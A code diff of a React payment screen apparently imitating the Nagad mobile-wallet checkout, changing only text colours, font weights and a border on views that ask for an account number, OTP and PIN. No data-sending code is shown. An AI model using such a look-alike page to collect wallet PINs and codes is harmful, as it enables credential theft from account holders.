@@ -96,7 +96,7 @@ const NagadPayment = () => {
       elements.push(<div key={groupIndex} className="flex gap-0.5">{inputs}</div>);
       currentIndex += groupSize;
       if (groupIndex < groups.length - 1) {
-        elements.push(<span key={`sep-${groupIndex}`} className="text-white text-base font-bold mx-0.5">-</span>);
+        elements.push(<span key={`sep-${groupIndex}`} className="text-[#ccc] text-base font-bold mx-0.5">-</span>);
       }
     });
     return <div className="flex items-center justify-center">{elements}</div>;
@@ -117,13 +117,13 @@ const NagadPayment = () => {
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
-      <div className="w-full h-screen flex flex-col overflow-hidden border-2 border-black"
+      <div className="w-full h-screen flex flex-col overflow-hidden border-4 border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
       {showFailedView ? (
         <div className="flex-1 flex flex-col items-center justify-center">
-          <XCircle className="w-12 h-12 text-white mb-4" strokeWidth={1.5} />
-          <h3 className="text-white text-center text-lg font-medium mb-2">Payment Cancelled</h3>
-          <p className="text-white text-center text-sm">Redirecting to Merchant Website in {redirectTimer}s</p>
+          <XCircle className="w-12 h-12 text-[#ccc] mb-4" strokeWidth={1.5} />
+          <h3 className="text-[#ccc] text-center text-lg font-bold mb-2">Payment Cancelled</h3>
+          <p className="text-[#ccc] text-center text-sm font-bold">Redirecting to Merchant Website in {redirectTimer}s</p>
         </div>
       ) : (
         <div className="flex-1 flex flex-col">
@@ -140,22 +140,22 @@ const NagadPayment = () => {
           {/* Cart Icon & Title */}
           <div className="flex flex-col items-center pt-1 pb-2">
             <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
-            <h1 className="text-white text-base font-semibold">Easy Payment System</h1>
+            <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
           </div>
 
           {/* Invoice Details */}
           <div className="px-5 py-2 space-y-1">
             <div className="flex">
-              <span className="text-white font-bold text-xs w-28">Invoice No:</span>
-              <span className="text-white/70 text-xs">B255527202718B</span>
+              <span className="text-[#ccc] font-bold text-xs w-28">Invoice No:</span>
+              <span className="text-[#ccc] font-bold text-xs">B255527202718B</span>
             </div>
             <div className="flex">
-              <span className="text-white font-bold text-xs w-28">Total Amount:</span>
-              <span className="text-white/70 text-xs">BDT 434</span>
+              <span className="text-[#ccc] font-bold text-xs w-28">Total Amount:</span>
+              <span className="text-[#ccc] font-bold text-xs">BDT 434</span>
             </div>
             <div className="flex">
-              <span className="text-white font-bold text-xs w-28">Charge:</span>
-              <span className="text-white/70 text-xs">BDT 0</span>
+              <span className="text-[#ccc] font-bold text-xs w-28">Charge:</span>
+              <span className="text-[#ccc] font-bold text-xs">BDT 0</span>
             </div>
           </div>
 
@@ -165,12 +165,12 @@ const NagadPayment = () => {
           <div className="px-5 pb-2">
             {showPinView ? (
               <div className="flex flex-col items-center">
-                <p className="text-white text-center text-sm font-medium mb-3">Enter PIN</p>
+                <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter PIN</p>
                 {renderPinInputs()}
               </div>
             ) : showOtpView ? (
               <div className="flex flex-col items-center">
-                <p className="text-white text-center text-sm font-medium mb-3">Enter Verification Code [OTP]</p>
+                <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter Verification Code [OTP]</p>
                 <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                   onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                   placeholder="XXX|XXX"
@@ -179,7 +179,7 @@ const NagadPayment = () => {
               </div>
             ) : (
               <div className="flex flex-col items-center">
-                <p className="text-white text-center text-sm font-semibold mb-3">Your Nagad Account Number</p>
+                <p className="text-[#ccc] text-center text-sm font-bold mb-3">Your Nagad Account Number</p>
                 {renderPhoneInputs()}
                 {phoneError && (
                   <p className="text-yellow-300 text-xs font-medium mt-2">{phoneError}</p>
@@ -191,9 +191,9 @@ const NagadPayment = () => {
           {/* Terms */}
           <div className="px-5 py-1">
             {!showOtpView && !showPinView && (
-              <p className="text-white/80 text-center text-[10px] leading-tight">
+              <p className="text-[#ccc] text-center text-[10px] leading-tight font-bold">
                 By clicking/tapping "Proceed" you are agreeing to our{" "}
-                <span className="text-white font-semibold underline">Terms and Conditions</span>
+                <span className="text-[#ccc] font-bold underline">Terms and Conditions</span>
               </p>
             )}
           </div>
